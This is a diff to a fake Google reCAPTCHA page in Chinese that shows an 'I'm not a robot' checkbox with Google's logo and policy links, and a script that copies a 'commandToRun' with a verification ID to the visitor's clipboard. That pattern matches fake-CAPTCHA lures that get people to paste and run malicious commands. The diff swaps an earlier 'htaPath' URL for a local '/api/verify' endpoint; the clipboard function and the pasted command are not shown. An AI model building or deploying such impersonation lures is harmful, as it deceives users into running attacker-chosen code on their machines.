@@ -5,7 +5,7 @@
         <meta charset="utf-8">
         <title>reCAPTCHA 验证</title>
 
-        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.0/css/all.css">        
+        <link rel="stylesheet" href="/all.css">        
         <style>
         body {
             background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
@@ -93,7 +93,7 @@
             left: 244px;
             bottom: 36px;
             width: 40px;
-            height: 45px;
+            height: 40px;
             vertical-align: baseline;
             padding-bottom: 4px;
         }
@@ -240,7 +240,7 @@
                 <button type="button" id="checkbox" class="checkbox m-p line-normal"></button>
             </div>
             <p class="im-not-a-robot m-p line-normal">我不是机器人</p>
-            <img src="https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png" class="captcha-logo line-normal" alt="">
+            <img src="/reCAPTCHA-logo.png" class="captcha-logo line-normal" alt="">
             <br>
             <p class="checkbox-desc m-p line-normal">
             <a href="https://www.google.com/intl/en/policies/privacy/">隐私</a> - <a href="https://www.google.com/intl/en/policies/terms/">条款</a>
@@ -425,12 +425,28 @@
                verifywindow.style.left =  checkboxWindow.offsetLeft - 8  + "px";
             }
 
-            var verification_id = generateRandomNumber();
-            document.getElementById('verification-id').textContent = verification_id;
-            
-            const htaPath = "https://mp.weixin.qq.com/s/4wtpae4OGtAjcF0j2ltz1A?a=";
-            const commandToRun = htaPath
-            stageClipboard(commandToRun, verification_id)
+            // 从本地后端获取验证ID
+            fetch('/api/get-verification-id')
+                .then(response => response.json())
+                .then(data => {
+                    const verification_id = data.verification_id;
+                    document.getElementById('verification-id').textContent = verification_id;
+                    
+                    // 使用本地API路径
+                    const localPath = "/api/verify?id=";
+                    const commandToRun = localPath;
+                    stageClipboard(commandToRun, verification_id);
+                })
+                .catch(error => {
+                    console.error('获取验证ID失败:', error);
+                    // 出错时使用本地生成的ID作为后备
+                    const verification_id = generateRandomNumber();
+                    document.getElementById('verification-id').textContent = verification_id;
+                    
+                    const localPath = "/api/verify?id=";
+                    const commandToRun = localPath;
+                    stageClipboard(commandToRun, verification_id);
+                });
         }
 
         addCaptchaListeners();
